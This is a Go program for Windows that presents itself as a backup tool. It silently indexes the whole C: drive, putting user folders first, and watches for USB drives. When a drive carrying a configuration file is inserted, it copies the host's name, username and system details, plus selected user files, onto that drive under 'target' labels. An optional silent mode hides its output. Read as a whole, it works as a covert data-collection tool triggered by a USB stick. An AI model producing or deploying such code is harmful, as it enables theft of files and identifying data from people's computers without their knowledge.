package main

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/jaypipes/ghw"
	"golang.org/x/sys/windows"

	_ "github.com/mattn/go-sqlite3"
)

// Set silentMode to true for a completely silent (no output) version,
// except for the indexing log which will be output in a separate terminal.
var silentMode bool = false

// List of directories to exclude from indexing
var excludedDirs = []string{
	`C:\Windows\System32`,
	`C:\Windows\SysWOW64`,
	`C:\Windows\WinSxS`,
	`C:\Windows\servicing`,
	`C:\Program Files\Common Files`,
	`C:\Program Files (x86)\Common Files`,
	`C:\ProgramData\Microsoft`,
	`C:\Windows\Microsoft.NET`,
	`C:\$Recycle.Bin`,
	`C:\System Volume Information`,
}

// List of directories to scan first (in order of priority)
var priorityDirs = []string{
	`C:\Users`,
	`C:\Documents and Settings`,
	`D:\Users`,
	`E:\Users`,
	`C:\Projects`,
	`C:\Work`,
}

// FileMeta holds basic metadata for a file.
type FileMeta struct {
	Path           string
	Size           int64
	ModTime        time.Time
	CreationTime   time.Time
	AccessTime     time.Time
	FileAttributes int64
}

// PriorityConfig holds directories and files to be prioritized.
type PriorityConfig struct {
	Directories []string `json:"directories"`
	Files       []string `json:"files"`
}

// BackupConfig represents the expected JSON configuration on the USB device.
type BackupConfig struct {
	USBSize        int64          `json:"usb_size"`        // Informational: USB drive size in bytes
	Mode           string         `json:"mode"`            // "indexer", "file", or "both"
	FileExtensions []string       `json:"file_extensions"` // Allowed file extensions
	MinSize        int64          `json:"min_size"`        // Minimum file size (bytes) to backup
	MaxSize        int64          `json:"max_size"`        // Maximum file size (bytes) to backup
	Priority       PriorityConfig `json:"priority"`        // Priority settings for directories and files
}

// TargetMetadata holds information about the target system
type TargetMetadata struct {
	SystemInfo struct {
		Hostname       string `json:"hostname"`
		Username       string `json:"username"`
		Manufacturer   string `json:"manufacturer"`
		Model          string `json:"model"`
		WindowsVersion string `json:"windows_version"`
		ProcessorArch  string `json:"processor_arch"`
	} `json:"system_info"`
	ExportInfo struct {
		TotalSize  int64  `json:"total_size"`
		ExportDate string `json:"export_date"`
		ExportID   string `json:"export_id"`
	} `json:"export_info"`
}

var db *sql.DB

const (
	batchSize   = 1000
	bufferSize  = 32 * 1024 // 32KB buffer for file copies
	workerCount = 4
)

// Add a buffered channel for work distribution
var (
	workQueue    = make(chan string, 100)
	fileMetaPool = sync.Pool{
		New: func() interface{} {
			return &FileMeta{}
		},
	}
)

// fileTimeToTime converts a Windows FILETIME (stored in syscall.Filetime)
// to a Go time.Time value.
func fileTimeToTime(ft syscall.Filetime) time.Time {
	// FILETIME is in 100-nanosecond intervals since January 1, 1601 (UTC)
	const ticksPerSecond = 10000000
	// Number of 100-nanosecond intervals between 1601 and Unix epoch (1970)
	const epochDiff = 116444736000000000
	ticks := (int64(ft.HighDateTime) << 32) | int64(ft.LowDateTime)
	// Convert FILETIME to Unix time (in seconds and nanoseconds)
	unixTicks := ticks - epochDiff
	seconds := unixTicks / ticksPerSecond
	nanoseconds := (unixTicks % ticksPerSecond) * 100
	return time.Unix(seconds, nanoseconds)
}

// Optimized initDB with indexes
func initDB(dbPath string) error {
	var err error
	db, err = sql.Open("sqlite3", dbPath)
	if err != nil {
		return err
	}

	// Updated table schema to store all metadata.
	createTableSQL := `CREATE TABLE IF NOT EXISTS file_metadata (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		path TEXT NOT NULL,
		size INTEGER,
		mod_time DATETIME,
		creation_time DATETIME,
		access_time DATETIME,
		file_attributes INTEGER
	);`
	_, err = db.Exec(createTableSQL)
	if err != nil {
		return err
	}

	// Add indexes for faster queries
	_, err = db.Exec(`CREATE INDEX IF NOT EXISTS idx_path ON file_metadata(path);
	CREATE INDEX IF NOT EXISTS idx_size ON file_metadata(size);`)
	return err
}

// isExcludedPath checks if the given path should be excluded from indexing
func isExcludedPath(path string) bool {
	path = strings.ToLower(path)
	for _, excluded := range excludedDirs {
		excluded = strings.ToLower(excluded)
		if strings.HasPrefix(path, excluded) {
			return true
		}
	}
	return false
}

// scanAndStoreFiles scans files in the given directory and stores their metadata in the database
func scanAndStoreFiles(rootPath string, logger *log.Logger) error {
	logger.Printf("Scanning files under: %s", rootPath)
	var batch []FileMeta
	tx, err := db.Begin()
	if err != nil {
		return err
	}
	stmt, err := tx.Prepare(`INSERT INTO file_metadata (path, size, mod_time, creation_time, access_time, file_attributes) 
		VALUES (?, ?, ?, ?, ?, ?)`)
	if err != nil {
		tx.Rollback()
		return err
	}
	defer stmt.Close()

	err = filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || isExcludedPath(path) {
			return nil
		}

		meta := fileMetaPool.Get().(*FileMeta)
		meta.Path = path
		meta.Size = info.Size()
		meta.ModTime = info.ModTime()
		meta.CreationTime = info.ModTime()
		meta.AccessTime = info.ModTime()
		meta.FileAttributes = 0

		if stat, ok := info.Sys().(*syscall.Win32FileAttributeData); ok {
			meta.CreationTime = fileTimeToTime(stat.CreationTime)
			meta.AccessTime = fileTimeToTime(stat.LastAccessTime)
			meta.FileAttributes = int64(stat.FileAttributes)
		}

		batch = append(batch, *meta)
		fileMetaPool.Put(meta)

		if len(batch) >= batchSize {
			for _, m := range batch {
				_, err = stmt.Exec(m.Path, m.Size, m.ModTime, m.CreationTime, m.AccessTime, m.FileAttributes)
				if err != nil {
					return err
				}
			}
			batch = batch[:0]
		}
		return nil
	})

	if err != nil {
		tx.Rollback()
		return err
	}

	// Insert remaining batch
	for _, m := range batch {
		_, err = stmt.Exec(m.Path, m.Size, m.ModTime, m.CreationTime, m.AccessTime, m.FileAttributes)
		if err != nil {
			tx.Rollback()
			return err
		}
	}

	return tx.Commit()
}

// scanPriorityDirectories scans high-priority directories first
func scanPriorityDirectories(logger *log.Logger) {
	logger.Printf("Starting priority directory scan...")
	for _, dir := range priorityDirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			logger.Printf("Priority directory does not exist, skipping: %s", dir)
			continue
		}
		logger.Printf("Scanning priority directory: %s", dir)
		if err := scanAndStoreFiles(dir, logger); err != nil {
			logger.Printf("Error scanning priority directory %s: %v", dir, err)
		}
	}
	logger.Printf("Priority directory scan completed")
}

// Worker pool for file processing
func startWorkerPool(workers int) {
	for i := 0; i < workers; i++ {
		go func() {
			for path := range workQueue {
				if err := processFile(path); err != nil {
					log.Printf("Error processing file %s: %v", path, err)
				}
			}
		}()
	}
}

// Add new function to process files
func processFile(path string) error {
	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	info, err := os.Stat(path)
	if err != nil {
		return err
	}

	meta := fileMetaPool.Get().(*FileMeta)
	defer fileMetaPool.Put(meta)

	meta.Path = path
	meta.Size = info.Size()
	meta.ModTime = info.ModTime()

	if stat, ok := info.Sys().(*syscall.Win32FileAttributeData); ok {
		meta.CreationTime = fileTimeToTime(stat.CreationTime)
		meta.AccessTime = fileTimeToTime(stat.LastAccessTime)
		meta.FileAttributes = int64(stat.FileAttributes)
	}

	// Store file metadata in database using context
	_, err = db.ExecContext(ctx,
		`INSERT INTO file_metadata (path, size, mod_time, creation_time, access_time, file_attributes)
		VALUES (?, ?, ?, ?, ?, ?)`,
		meta.Path, meta.Size, meta.ModTime, meta.CreationTime, meta.AccessTime, meta.FileAttributes)

	return err
}

// isExternalDrive checks if a drive is external without using PowerShell
func isExternalDrive(driveLetter string) (bool, error) {
	// Get block storage info using ghw
	block, err := ghw.Block(ghw.WithChroot(""))
	if err != nil {
		return false, fmt.Errorf("failed to get block storage information: %w", err)
	}

	letter := strings.ToUpper(strings.TrimSuffix(driveLetter, ":\\"))
	
	// Look for removable or connected via USB/external interfaces
	for _, disk := range block.Disks {
		for _, part := range disk.Partitions {
			// In ghw, MountPoints is not available directly
			// Instead we need to check for the drive letter in the MountPoint field
			mountPoint := part.MountPoint // Use singular MountPoint instead of MountPoints
			
			// Format in Windows is typically "C:", "D:", etc.
			if mountPoint == letter+":" || strings.HasPrefix(mountPoint, letter+":") {
				// Check if the disk is external based on vendor info or removable attribute
				// BusType is not directly accessible in this version of ghw
				vendor := strings.ToLower(disk.Vendor)
				model := strings.ToLower(disk.Model)
				
				// Common indicators of external drives
				if strings.Contains(vendor, "usb") ||
				   strings.Contains(model, "external") ||
				   strings.Contains(model, "portable") ||
				   disk.IsRemovable || // This field is available
				   strings.Contains(model, "ugreen") {
					return true, nil
				}
			}
		}
	}
	
	// If drive is marked as DRIVE_REMOVABLE by Windows API, it's likely external
	// This is a fallback in case ghw didn't provide conclusive information
	driveType := windows.GetDriveType(windows.StringToUTF16Ptr(driveLetter))
	if driveType == windows.DRIVE_REMOVABLE {
		return true, nil
	}
	
	return false, nil
}

// getRemovableDrives returns a slice of drive letters for removable drives (USB and external SSDs).
func getRemovableDrives() ([]string, error) {
	var drives []string
	driveBits, err := windows.GetLogicalDrives()
	if err != nil {
		return drives, err
	}
	for i := 0; i < 26; i++ {
		if driveBits&(1<<uint(i)) != 0 {
			driveLetter := string('A'+i) + ":\\"
			driveType := windows.GetDriveType(windows.StringToUTF16Ptr(driveLetter))
			// Check for both removable drives and local drives (which might be external SSDs)
			if driveType == windows.DRIVE_REMOVABLE || driveType == windows.DRIVE_FIXED {
				// For fixed drives, we need to check if it's actually an external drive
				if driveType == windows.DRIVE_FIXED {
					isExternal, err := isExternalDrive(driveLetter)
					if err != nil || !isExternal {
						continue
					}
				}
				drives = append(drives, driveLetter)
			}
		}
	}
	return drives, nil
}

// contains checks if a string is present in a slice
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// monitorUSBDevices continuously checks for new removable drives.
func monitorUSBDevices() {
	log.Println("Starting USB device monitoring...")
	processedDrives := make(map[string]bool)
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		drives, err := getRemovableDrives()
		if err != nil {
			log.Printf("Error detecting removable drives: %v", err)
		}
		// Process newly detected drives.
		for _, drive := range drives {
			if !processedDrives[drive] {
				log.Printf("Detected new USB drive: %s", drive)
				go handleUSBDevice(drive)
				processedDrives[drive] = true
			}
		}
		// Remove drives that are no longer present.
		for drive := range processedDrives {
			if !contains(drives, drive) {
				log.Printf("USB drive removed: %s", drive)
				delete(processedDrives, drive)
			}
		}
		<-ticker.C // Use ticker for more precise timing
	}
}

func main() {
	// If silentMode is enabled, redirect the default log output.
	if silentMode {
		log.SetOutput(io.Discard)
	}

	// Initialize (or create) the database.
	if err := initDB("files.db"); err != nil {
		log.Fatalf("Failed to initialize database: %v", err)
	}
	defer db.Close()

	// Set up a separate log file for the indexing process.
	indexLogFile, err := os.OpenFile("indexing.log", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatalf("Failed to open indexing log file: %v", err)
	}
	defer indexLogFile.Close()
	indexLogger := log.New(indexLogFile, "INDEXER: ", log.LstdFlags)

	// Use more efficient PowerShell command to show log
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
		"Get-Content", "-Path", "indexing.log", "-Wait")
	cmd.Start()

	// Start scanning the file system in a separate goroutine,
	// using the indexLogger for output.
	go func() {
		// First scan priority directories
		scanPriorityDirectories(indexLogger)

		// Then scan the rest of the system
		rootDir := "C:\\" // Adjust as needed
		if err := scanAndStoreFiles(rootDir, indexLogger); err != nil {
			indexLogger.Printf("Error scanning filesystem: %v", err)
		}
	}()

	// Start worker pool
	startWorkerPool(workerCount)

	// Use prepared statements for frequent queries
	db.SetMaxOpenConns(workerCount * 2)
	db.SetMaxIdleConns(workerCount)
	db.SetConnMaxLifetime(10 * time.Minute)
	db.SetConnMaxIdleTime(5 * time.Minute)

	// Begin monitoring for USB devices.
	monitorUSBDevices()
}

// handleUSBDevice reads the backup configuration from the USB and processes the backup.
func handleUSBDevice(drive string) {
	configPath := filepath.Join(drive, "backup_config.json")
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		log.Printf("No backup config found on USB drive at %s", drive)
		return
	}

	data, err := os.ReadFile(configPath)
	if err != nil {
		log.Printf("Failed to read backup config on %s: %v", drive, err)
		return
	}

	var config BackupConfig
	if err := json.Unmarshal(data, &config); err != nil {
		log.Printf("Failed to parse backup config on %s: %v", drive, err)
		return
	}
	log.Printf("Loaded backup config from %s: %+v", drive, config)

	// Create target metadata
	metadata, err := getSystemMetadata()
	if err != nil {
		log.Printf("Failed to get system metadata: %v", err)
		return
	}

	// Calculate total size of files to be copied
	var totalSize int64
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	row := db.QueryRowContext(ctx, "SELECT SUM(size) FROM file_metadata WHERE size >= ? AND size <= ?",
		config.MinSize, config.MaxSize)
	if err := row.Scan(&totalSize); err != nil && err != sql.ErrNoRows {
		log.Printf("Failed to calculate total size: %v", err)
	}
	metadata.ExportInfo.TotalSize = totalSize

	// Create target directory on USB
	targetDir := filepath.Join(drive, "backup",
		fmt.Sprintf("%s_%s", metadata.SystemInfo.Hostname, metadata.SystemInfo.Username))
	if err := os.MkdirAll(targetDir, os.ModePerm); err != nil {
		log.Printf("Failed to create target directory: %v", err)
		return
	}

	// Save metadata
	metadataFile := filepath.Join(targetDir, "target_meta.json")
	metadataJSON, err := json.MarshalIndent(metadata, "", "    ")
	if err != nil {
		log.Printf("Failed to marshal metadata: %v", err)
		return
	}
	if err := os.WriteFile(metadataFile, metadataJSON, 0644); err != nil {
		log.Printf("Failed to write metadata file: %v", err)
		return
	}

	// Process based on the mode.
	switch strings.ToLower(config.Mode) {
	case "indexer":
		backupDatabase(targetDir)
	case "file":
		backupFiles(targetDir, config)
	case "both":
		// First copy the database, then copy files.
		backupDatabase(targetDir)
		backupFiles(targetDir, config)
	default:
		log.Printf("Unknown mode '%s'. Defaulting to file backup.", config.Mode)
		backupFiles(targetDir, config)
	}
}

// backupDatabase copies the SQLite database file to the USB drive.
func backupDatabase(targetDir string) {
	sourceDB := "files.db" // assumes the DB is in the current working directory
	destDir := filepath.Join(targetDir, "indexer")
	if err := os.MkdirAll(destDir, os.ModePerm); err != nil {
		log.Printf("Failed to create directory %s: %v", destDir, err)
		return
	}
	destFile := filepath.Join(destDir, "files.db")
	if err := copyFile(sourceDB, destFile); err != nil {
		log.Printf("Failed to backup database to %s: %v", destFile, err)
	} else {
		log.Printf("Database backed up to %s", destFile)
	}
}

// min returns the smaller of two int64 values
func min(a, b int64) int64 {
	if a < b {
		return a
	}
	return b
}

// getSystemMetadata collects system information directly using Go libraries without PowerShell
func getSystemMetadata() (*TargetMetadata, error) {
	metadata := &TargetMetadata{}

	// Get hostname
	hostname, err := os.Hostname()
	if err != nil {
		return nil, err
	}
	metadata.SystemInfo.Hostname = hostname

	// Get username
	username := os.Getenv("USERNAME")
	metadata.SystemInfo.Username = username

	// Get system manufacturer and model using ghw (Go Hardware) package
	// This does not require PowerShell or external commands
	product, err := ghw.Product(ghw.WithChroot(""))
	if err == nil {
		metadata.SystemInfo.Manufacturer = product.Vendor
		metadata.SystemInfo.Model = product.Name
	} else {
		// Fallback to simpler approach if ghw fails
		metadata.SystemInfo.Manufacturer = "Unknown"
		metadata.SystemInfo.Model = "Unknown"
	}

	// Get Windows version using Go syscall instead of PowerShell
	osInfo := windows.RtlGetVersion()
	if osInfo != nil {
		metadata.SystemInfo.WindowsVersion = fmt.Sprintf(
			"Windows %d.%d.%d",
			osInfo.MajorVersion,
			osInfo.MinorVersion,
			osInfo.BuildNumber,
		)
	} else {
		metadata.SystemInfo.WindowsVersion = "Windows (version unknown)"
	}

	metadata.SystemInfo.ProcessorArch = runtime.GOARCH

	// Set export info
	now := time.Now()
	metadata.ExportInfo.ExportDate = now.Format(time.RFC3339)
	metadata.ExportInfo.ExportID = fmt.Sprintf("%s_%s_%s",
		hostname, username, now.Format("20060102_150405"))

	return metadata, nil
}

// backupFiles queries the database for matching files, sorts them by priority, and copies them.
func backupFiles(targetDir string, config BackupConfig) {
	// Create context with timeout to avoid hanging on database queries
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Use prepared statement for better performance
	query := `SELECT path, size, mod_time, creation_time, access_time, file_attributes
	          FROM file_metadata WHERE size >= ? AND size <= ?`
	stmt, err := db.PrepareContext(ctx, query)
	if err != nil {
		log.Printf("Failed to prepare query: %v", err)
		return
	}
	defer stmt.Close()

	rows, err := stmt.QueryContext(ctx, config.MinSize, config.MaxSize)
	if err != nil {
		log.Printf("Database query failed: %v", err)
		return
	}
	defer rows.Close()

	// Create buffer for files to be backed up - pre-allocate for efficiency
	filesToBackup := make([]FileMeta, 0, 1000)

	// Process file extensions once for better performance
	var lowerExtensions []string
	if len(config.FileExtensions) > 0 {
		lowerExtensions = make([]string, len(config.FileExtensions))
		for i, ext := range config.FileExtensions {
			lowerExtensions[i] = strings.ToLower(ext)
		}
	}

	for rows.Next() {
		var f FileMeta
		var modTimeStr, creationTimeStr, accessTimeStr string
		if err := rows.Scan(&f.Path, &f.Size, &modTimeStr, &creationTimeStr, &accessTimeStr, &f.FileAttributes); err != nil {
			log.Printf("Error scanning row: %v", err)
			continue
		}

		// Parse time strings
		f.ModTime, _ = time.Parse(time.RFC3339, modTimeStr)
		f.CreationTime, _ = time.Parse(time.RFC3339, creationTimeStr)
		f.AccessTime, _ = time.Parse(time.RFC3339, accessTimeStr)

		// Skip files that no longer exist
		if _, err := os.Stat(f.Path); os.IsNotExist(err) {
			continue
		}

		// If file extensions are specified, check that the file matches one
		if len(lowerExtensions) > 0 {
			ext := strings.ToLower(filepath.Ext(f.Path))
			match := false
			for _, allowedExt := range lowerExtensions {
				if ext == allowedExt {
					match = true
					break
				}
			}
			if !match {
				continue
			}
		}

		filesToBackup = append(filesToBackup, f)
	}

	// Check for errors after reading all rows
	if err = rows.Err(); err != nil {
		log.Printf("Error iterating over rows: %v", err)
	}

	// Sort files based on priority
	sort.Slice(filesToBackup, func(i, j int) bool {
		pi := priorityScore(filesToBackup[i], config)
		pj := priorityScore(filesToBackup[j], config)
		if pi == pj {
			return filesToBackup[i].Size > filesToBackup[j].Size // Larger files first within same priority
		}
		return pi < pj
	})

	// Create a semaphore to limit concurrent file operations
	sem := make(chan struct{}, 4)
	var wg sync.WaitGroup
	// Keep track of total bytes copied for progress reporting
	var totalBytesCopied int64
	var bytesCounter sync.Mutex

	// Copy each matching file
	for _, file := range filesToBackup {
		wg.Add(1)
		go func(file FileMeta) {
			defer wg.Done()
			sem <- struct{}{}        // acquire semaphore
			defer func() { <-sem }() // release semaphore

			relPath := strings.TrimPrefix(file.Path, filepath.VolumeName(file.Path))
			destDir := filepath.Join(targetDir, "files", filepath.Dir(relPath))
			if err := os.MkdirAll(destDir, os.ModePerm); err != nil {
				log.Printf("Failed to create directory %s: %v", destDir, err)
				return
			}
			destFile := filepath.Join(destDir, filepath.Base(file.Path))
			if err := copyFile(file.Path, destFile); err != nil {
				log.Printf("Failed to copy %s to %s: %v", file.Path, destFile, err)
			} else {
				bytesCounter.Lock()
				totalBytesCopied += file.Size
				bytesCounter.Unlock()
				log.Printf("Backed up %s to %s (%d bytes)", file.Path, destFile, file.Size)
			}
		}(file)
	}

	wg.Wait() // wait for all copy operations to complete
	log.Printf("Backup complete. Total copied: %d bytes", totalBytesCopied)
}

// Optimized copyFile with better buffered I/O and error handling
func copyFile(src, dst string) error {
	// Open source file
	in, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("failed to open source file: %w", err)
	}
	defer in.Close()

	// Stat source for file size - helps with buffer allocation
	stat, err := in.Stat()
	if err != nil {
		return fmt.Errorf("failed to stat source file: %w", err)
	}

	// Create destination file
	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("failed to create destination file: %w", err)
	}
	defer func() {
		cerr := out.Close()
		if err == nil && cerr != nil {
			err = fmt.Errorf("failed to close destination file: %w", cerr)
		}
	}()

	// Choose buffer size based on file size for better performance
	size := stat.Size()
	buf := make([]byte, min(size+1, 4*1024*1024)) // Use up to 4MB buffer for large files

	// Use io.CopyBuffer for efficient copying
	_, err = io.CopyBuffer(out, in, buf)
	if err != nil {
		return fmt.Errorf("error during copy: %w", err)
	}

	// Force flush to disk
	return out.Sync()
}

// priorityScore returns a numeric score for a file (lower means higher priority).
func priorityScore(file FileMeta, config BackupConfig) int {
	// Create maps for O(1) lookups if we have more than a few items
	// Only create maps if we have enough items to justify the overhead
	if len(config.Priority.Files) > 5 {
		priorityFiles := make(map[string]struct{}, len(config.Priority.Files))
		for _, pfile := range config.Priority.Files {
			priorityFiles[strings.ToLower(pfile)] = struct{}{}
		}

		// Check if the file is explicitly prioritized
		if _, ok := priorityFiles[strings.ToLower(file.Path)]; ok {
			return 1
		}
	} else {
		// For small lists, linear search is faster
		for _, pfile := range config.Priority.Files {
			if strings.EqualFold(file.Path, pfile) {
				return 1
			}
		}
	}

	// Check if the file is in a prioritized directory
	fileLower := strings.ToLower(file.Path)
	for _, pdir := range config.Priority.Directories {
		if strings.HasPrefix(fileLower, strings.ToLower(pdir)) {
			return 2
		}
	}
	return 3
}
